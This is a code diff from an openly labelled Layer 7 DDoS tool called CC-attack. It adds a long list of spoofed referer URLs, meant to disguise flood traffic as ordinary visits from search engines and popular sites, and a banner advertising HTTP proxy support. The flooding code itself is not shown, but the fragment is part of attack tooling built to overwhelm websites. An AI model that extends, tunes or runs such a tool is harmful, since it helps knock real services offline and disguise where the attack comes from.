@@ -20,13 +20,55 @@ count = 0
 headers = []
 referer = [
     "https://google.it/",
-    "https://facebook.com/",
     "https://duckduckgo.com/",
     "https://google.com/",
-    "https://youtube.com",
     "https://yandex.com",
+    "https://www.google.com/search?q=",
+	"https://check-host.net/",
+	"https://www.facebook.com/",
+	"https://www.youtube.com/",
+	"https://www.fbi.com/",
+	"https://www.bing.com/search?q=",
+	"https://r.search.yahoo.com/",
+	"https://www.cia.gov/index.html",
+	"https://vk.com/profile.php?redirect=",
+	"https://www.usatoday.com/search/results?q=",
+	"https://help.baidu.com/searchResult?keywords=",
+	"https://steamcommunity.com/market/search?q=",
+	"https://www.ted.com/search?q=",
+	"https://play.google.com/store/search?q=",
+	"https://www.qwant.com/search?q=",
+	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
+	"https://www.google.ad/search?q=",
+	"https://www.google.ae/search?q=",
+	"https://www.google.com.af/search?q=",
+	"https://www.google.com.ag/search?q=",
+	"https://www.google.com.ai/search?q=",
+	"https://www.google.al/search?q=",
+	"https://www.google.am/search?q=",
+	"https://www.google.co.ao/search?q=",
 ]
 
+print ('''
+	   /////    /////    /////////////
+	  CCCCC/   CCCCC/   | CC-attack |/
+	 CC/      CC/       |-----------|/ 
+	 CC/      CC/       |  Layer 7  |/ 
+	 CC/////  CC/////   | ddos tool |/ 
+	  CCCCC/   CCCCC/   |___________|/
+>--------------------------------------------->
+Version 3.7.1 (2022/3/24)
+                              C0d3d by L330n123
+┌─────────────────────────────────────────────┐
+│        Tos: Don't attack .gov website       │
+├─────────────────────────────────────────────┤
+│                 New stuff:                  │
+│          [+] Added Http Proxy Support       │
+│          [+] Optimization                   │
+│          [+] Changed Varible Name           │
+├─────────────────────────────────────────────┤
+│ Link: https://github.com/Leeon123/CC-attack │
+└─────────────────────────────────────────────┘''')
 
 def useragent():
     global headers
